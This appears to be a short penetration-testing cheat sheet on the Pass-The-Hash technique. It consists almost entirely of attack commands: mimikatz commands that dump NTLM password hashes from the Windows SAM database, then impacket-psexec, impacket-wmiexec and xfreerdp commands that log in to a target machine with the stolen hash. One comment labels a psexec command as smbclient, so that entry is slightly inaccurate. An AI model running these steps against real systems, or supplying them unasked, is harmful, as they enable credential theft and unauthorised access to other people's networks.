### **Pass-The-Hash**

1. Dump the SAM Database:

```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
...

mimikatz # lsadump::sam
RID  : <RID>
User : <USERNAME>
Hash NTLM: <NTLM_HASH>

```

1. Authenticate

```bash
# Using smbclient
impacket-psexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>

# Using PsExec
impacket-psexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>

# Using WMIExec
impacket-wmiexec -hashes <LM_HASH>:<NTLM_HASH> <USERNAME>@<TARGET_IP>

# Using xfreerdp
xfreerdp /v:<target_ip> /u:<USERNAME> /pth:<NTLM_HASH> /size:<resolution>

```
